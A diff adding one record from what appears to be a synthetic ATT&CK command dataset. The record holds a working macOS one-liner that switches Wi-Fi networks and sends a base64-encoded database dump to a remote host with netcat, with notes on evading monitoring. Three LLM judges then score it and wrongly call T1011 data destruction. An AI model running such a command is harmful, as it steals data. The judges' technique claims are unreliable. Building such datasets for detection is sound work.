@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
+  "explanation": "Uses an alternate Wi\u2011Fi SSID to exfiltrate a database dump via IPv6 UDP to a high, uncommon port, reducing overlap with typical monitored services. This leverages a different network medium than the primary channel, consistent with T1011.",
+  "rationale_steps": [
+    "Drop any existing Wi\u2011Fi association.",
+    "Join a non-corporate SSID on a less common 5 GHz channel.",
+    "Base64-encode the dump to make payload less obvious in transit.",
+    "Transmit via IPv6 UDP on a high port scoped to the Wi\u2011Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-0762cc79",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags, and correct syntax for all three components (airport command, networksetup, and netcat).",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over an alternate network connection, it doesn't align with T1011 (Data Destruction) as it's performing data exfiltration rather than destroying data, making it more aligned with T1048 (Exfiltration Over Alternative Protocol).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:11:10.823923Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct use of `sudo`, valid macOS utility paths, proper command separators, balanced quotes for network credentials, and syntactically correct `base64` and `nc` commands, including a valid IPv6 link-local address.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration by encoding a database dump and sending it over UDP, which is entirely unrelated to data destruction (T1011); the explanation's claim of consistency with T1011 is fundamentally incorrect as the command's actions do not involve destroying or rendering data unrecoverable.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:11:20.100351Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, correct separators, and valid flags for airport, networksetup, base64, and nc including a valid IPv6 link-local scope.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration over Wi\u2011Fi/IPv6 rather than any data destruction, and it also assumes sudo despite 'Privilege: None'.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:12:01.288470Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
